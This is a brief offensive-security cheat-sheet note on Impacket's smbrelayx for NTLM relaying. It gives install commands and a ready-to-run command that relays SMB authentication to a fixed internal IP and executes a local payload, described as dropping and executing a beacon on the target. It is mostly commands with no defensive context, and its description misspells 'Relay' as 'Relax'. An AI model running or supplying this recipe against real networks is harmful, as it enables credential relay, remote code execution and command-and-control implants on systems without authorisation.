# smbrelayx

## [[NTLM Relaying]]
1. Install
    ```bash
    pip3 install impacket
    git clone https://github.com/SecureAuthCorp/impacket
    ```
2. Drop and execute beacon on device
    ```bash
    cd impacket
    sudo python3 examples/smbrelayx.py -h 192.168.1.118 -e ~/smbexp.exe
    ```

```meta
requirements: 
results: 
oss: #linux
source: https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py
description: Relax SMB requests to target 
```